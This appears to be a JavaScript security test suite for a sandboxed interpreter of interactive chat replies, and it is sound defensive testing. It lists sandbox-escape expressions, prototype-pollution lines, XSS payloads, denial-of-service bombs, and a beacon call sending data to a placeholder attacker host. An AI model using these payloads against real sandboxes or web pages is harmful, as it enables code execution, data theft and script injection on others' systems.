// Tries to break out of the interactive reply interpreter: replies are untrusted, so nothing they
// contain may reach the host, loop forever or inject markup. Plain Node.
import assert from 'node:assert/strict';
import vm from 'node:vm';
import { random, read, runs, suite, within } from './lib/check.mjs';

const { test, finish } = suite();
const context = vm.createContext({ window: {}, URL });
for (const file of ['ui/vendor/acorn.js', 'ui/response-tags.js', 'ui/interactive.js']) vm.runInContext(read(file), context, { filename: file });
context.window.acorn = context.acorn;
const session = () => context.window.QInteractive.createSession();
const prototypes = () => vm.runInContext('({polluted:({}).polluted,array:[].polluted,fn:(function(){}).polluted,hacked:typeof hacked,win:typeof window.hacked})', context);
const assertClean = (label) => {
  const seen = prototypes();
  assert.equal(seen.polluted, undefined, label);
  assert.equal(seen.array, undefined, label);
  assert.equal(seen.fn, undefined, label);
  assert.equal(seen.hacked, 'undefined', label);
  assert.equal(seen.win, 'undefined', label);
};

const ESCAPES = [
  'window', 'globalThis', 'this', 'self', 'document', 'process', 'require', 'module', 'console', 'fetch', 'Function', 'eval', 'Object', 'Reflect', 'Proxy', 'Symbol',
  '(function(){return this})()', '(()=>this)()', '[].constructor', '[].constructor.constructor("return globalThis")()', '"".constructor.constructor("return globalThis")()', '(()=>{}).constructor("return globalThis")()',
  '({}).__proto__', '({}).__proto__.polluted=1', '({}).constructor.prototype.polluted=1', '[]["__proto__"]', '[]["con"+"structor"]', '({})[`__proto__`]', '({})[["__proto__"]]', '({})[{toString:()=>"__proto__"}]', 'DIL.__proto__', 'DIL.constructor', 'DIL.useState.constructor', 'DIL["useState"]["call"]', 'DIL.useState.bind(null)', 'DIL.useState.apply',
  'new Function("hacked=1")()', 'new Date()', 'new Map()', 'class X {}', 'async()=>{}', 'function*(){}', 'import("x")', 'import.meta', '`${window}`', 'String.raw`x`', 'hacked=1', 'var hacked=1', 'delete window', 'typeof window', 'void window', 'x=>x', 'a?.b?.c', '[...window]', '({...window})',
  '[1,2].map(window)', '[1].forEach(function(){hacked=1})', '"x".replace(/x/,()=>{hacked=1})', '"x".constructor', '"x".__proto__', '"x"["toString"]', '[].concat.call', '[].map.call', '[].join.constructor', 'JSON.parse("{}")', 'Math.constructor', 'Array.from', 'Object.keys', 'Object.assign({}.__proto__,{polluted:1})', 'Object.defineProperty', 'setTimeout("hacked=1")', 'alert(1)', 'location.href="https://evil.test"', 'navigator.sendBeacon("https://evil.test")'
];

test('no expression in a data block or a handler reaches the host', () => {
  for (const attack of ESCAPES) {
    const hostile = session();
    const text = `{@body const [n,setN]=DIL.useState(0); const x=${attack};}<button onClick={()=>{${attack}}}>Go</button>{n}{x}`;
    let view;
    assert.doesNotThrow(() => { view = hostile.render(text); }, attack);
    assert.equal(typeof view.text, 'string', attack);
    if (view.controls[0]) assert.doesNotThrow(() => hostile.dispatch(view.controls[0].id), attack);
    assertClean(attack);
    assert.doesNotMatch(view.text, /\[object |function |native code|globalThis/, attack);
  }
});

test('no expression in an inline value reaches the host', () => {
  for (const attack of ESCAPES) {
    const hostile = session();
    assert.doesNotThrow(() => hostile.render(`Before {${attack}} after <Card title={${attack}}>x</Card> {#if ${attack}}yes{/if} {#each ${attack} as v}{v}{/each}`), attack);
    assertClean(attack);
  }
});

test('runaway code stops at the budget', () => {
  for (const [name, source] of Object.entries({
    'while loop': '{@body const x=(()=>{while(true){}})();}',
    'for loop': '{@body const x=(()=>{for(;;){}})();}',
    recursion: '{@body const f=n=>f(n+1); const x=f(0);}',
    'mutual recursion': '{@body const a=n=>b(n); const b=n=>a(n); const x=a(0);}',
    'exponential calls': '{@body const f=n=>n?f(n-1)+f(n-1):1; const x=f(60);}',
    'array bomb': '{@body const a=[1,2,3,4,5,6,7,8,9,10]; const b=a.map(x=>a.map(y=>a.map(z=>a.map(w=>a.map(v=>v))))); }{b}',
    'string bomb': `{@body let s="${'x'.repeat(1000)}"; const a=[s,s,s,s,s,s,s,s,s,s]; const t=a.join(a.join(a.join(s)));}{t}`,
    'each bomb': `{#each [${Array(900).fill('1').join(',')}] as a}{#each [${Array(900).fill('1').join(',')}] as b}{a}{b}{/each}{/each}`,
    'deep arrays': `{@body const x=${'['.repeat(5000)}${']'.repeat(5000)};}`,
    'deep expression': `{@body const x=${'('.repeat(5000)}1${')'.repeat(5000)};}`,
    'long chain': `{@body const x=1${'+1'.repeat(50000)};}`
  })) {
    const hostile = session();
    const view = within(4000, () => hostile.render(source), name);
    assert.ok(view.text.length <= 100000 + 1000, `${name} rendered ${view.text.length} characters`);
  }
});

test('a handler that never ends is stopped and leaves the session usable', () => {
  const hostile = session();
  const source = '{@body const [n,setN]=DIL.useState(0); const spin=()=>{while(true){setN(n+1)}};}<button onClick={spin}>Spin</button><button onClick={()=>setN(7)}>Set</button>{n}';
  const view = hostile.render(source);
  within(2000, () => hostile.dispatch(view.controls[0].id), 'spinning handler');
  const after = hostile.render(source);
  assert.equal(typeof after.text, 'string');
});

test('state values cannot inject markup or controls', () => {
  for (const payload of ['<script>hacked=1</script>', '<img src=x onerror=hacked=1>', '"><img src=x onerror=hacked=1>', '</button><button onClick={()=>1}>Fake</button>', '{@body const z=1}', '{#each [1] as a}', '`', '**', '[x](javascript:alert(1))', '![x](javascript:alert(1))', '&lt;script&gt;']) {
    const hostile = session();
    const source = `{@body const [v,setV]=DIL.useState("start");}<input value={v} onChange={x=>setV(x)}/><Card title={v}>{v}</Card>{v}`;
    const first = hostile.render(source);
    const control = first.controls[0].id;
    assert.equal(hostile.dispatch(control, payload), true, payload);
    const view = hostile.render(source);
    assert.doesNotMatch(view.text, /<(?:script|img|button)\b/i, payload);
    // An attribute value is plain text. Everywhere else, link syntax must arrive escaped.
    assert.doesNotMatch(view.text.replace(/title="[^"]*"/g, ''), /\]\(javascript:/i, payload);
    assert.equal(view.controls.length, 1, `${payload} must not add a control`);
    assertClean(payload);
  }
});

test('dispatch ignores anything that is not a live control', () => {
  const hostile = session();
  const source = '{@body const [n,setN]=DIL.useState(0);}<button onClick={()=>setN(n+1)}>Add</button>{n}';
  const view = hostile.render(source);
  for (const id of [undefined, null, '', 'nosuch', 'q999', 0, -1, NaN, {}, [], '__proto__', 'constructor', 'toString']) assert.equal(hostile.dispatch(id), false, String(id));
  assert.match(hostile.render(source).text, /0$/, 'failed dispatches change nothing');
  assert.equal(session().dispatch(view.controls[0].id), false, 'controls belong to their own session');
});

test('awkward event values never break a handler', () => {
  const source = '{@body const [v,setV]=DIL.useState("a");}<input value={v} onChange={x=>setV(x)}/>{v}';
  for (const value of [undefined, null, 0, -1, NaN, Infinity, true, {}, [], { toString() { throw new Error('boom'); } }, 'x'.repeat(200000), '\ud83d', '\u0000']) {
    const hostile = session();
    const { controls } = hostile.render(source);
    assert.doesNotThrow(() => hostile.dispatch(controls[0].id, value), String(typeof value));
    assert.doesNotThrow(() => hostile.render(source), String(typeof value));
  }
});

test('oversized sources are refused calmly', () => {
  const big = `{@body const x=1;}${'a'.repeat(300000)}`;
  const view = within(2000, () => session().render(big), 'huge source');
  assert.equal(typeof view.text, 'string');
  assert.equal(view.controls.length, 0);
});

test('literal code stays literal', () => {
  for (const code of ['`{@body const x=1;}`', '```\n{@body const x=1;}\n<button onClick={()=>1}>x</button>\n```', '~~~\n{#each [1] as a}{a}{/each}\n~~~', '`<button onClick={()=>1}>x</button>`']) {
    const view = session().render(code);
    assert.equal(view.text, code, code);
    assert.equal(view.controls.length, 0, code);
  }
});

test('random sources never throw out of the interpreter or touch the host', () => {
  const r = random(13);
  const parts = ['{', '}', '(', ')', '[', ']', '=>', '@body', '{@body ', '#each', '{#each ', '{/each}', '{#if ', '{:else}', '{/if}', 'const ', 'let ', 'x', 'y', '=', ';', ',', '.', '...', '"', "'", '`', '<button ', 'onClick={', '</button>', '<input ', '/>', '>', 'DIL.useState(', 'setX(', 'window', '__proto__', 'constructor', '1', '0', ' ', '\n', '+', '?', ':', '&&', 'as '];
  for (let i = 0; i < runs(2000); i++) {
    const source = r.text(parts, 30);
    const hostile = session();
    let view;
    assert.doesNotThrow(() => { view = hostile.render(source); }, JSON.stringify(source));
    for (const control of view.controls.slice(0, 2)) assert.doesNotThrow(() => hostile.dispatch(control.id, 'v'), JSON.stringify(source));
  }
  assertClean('fuzz');
});

await finish();
